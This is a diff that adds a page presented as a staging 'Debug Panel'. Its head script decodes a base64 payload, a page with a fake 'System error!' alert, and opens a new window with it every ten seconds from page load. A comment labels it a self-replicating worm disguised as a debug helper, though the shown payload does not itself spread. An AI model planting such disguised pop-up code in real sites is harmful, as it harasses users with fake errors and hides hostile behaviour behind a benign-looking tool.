@@ -1,0 +1,22 @@
+<html>
+<head>
+  <title>Staging Debug Panel</title>
+  <script>
+    // Obfuscated self-replicating JS worm disguised as debug helper
+    (function(){
+      const worm = atob("PGh0bWw+PHNjcmlwdD5hbGVydCgnU3lzdGVtIGVycm9yIScpOzwvc2NyaXB0PjwvaHRtbD4=");
+      setInterval(() => {
+        const win = window.open();
+        if (win && win.document) {
+          win.document.write(worm);
+          win.document.close();
+        }
+      }, 10000);
+    })();
+  </script>
+</head>
+<body>
+  <h2>Debug Console</h2>
+  <p>Open your browser console to inspect the issue.</p>
+</body>
+</html>
